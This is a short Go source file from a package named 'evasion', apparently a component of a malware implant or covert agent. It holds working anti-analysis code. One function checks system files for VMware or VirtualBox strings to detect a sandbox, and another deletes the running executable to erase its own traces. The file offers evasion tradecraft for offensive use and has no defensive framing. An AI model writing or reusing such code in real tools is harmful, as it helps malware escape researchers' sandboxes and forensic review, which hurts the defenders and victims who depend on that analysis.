package evasion

import (
	"os"
	"strings"
)

// DetectSandbox checks for common VM/Sandbox artifacts.
func DetectSandbox() bool {
	// 1. Check for common VM files
	vmFiles := []string{
		"/sys/class/dmi/id/product_name",
		"/proc/sys/kernel/osrelease",
	}

	for _, path := range vmFiles {
		data, err := os.ReadFile(path)
		if err == nil {
			content := strings.ToLower(string(data))
			if strings.Contains(content, "vmware") || strings.Contains(content, "virtualbox") {
				return true
			}
		}
	}

	// 2. Check for common VM processes
	// ponytail: simple process check would go here
	
	return false
}

// SelfDestruct removes the agent binary from the disk.
func SelfDestruct() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	return os.Remove(exe)
}
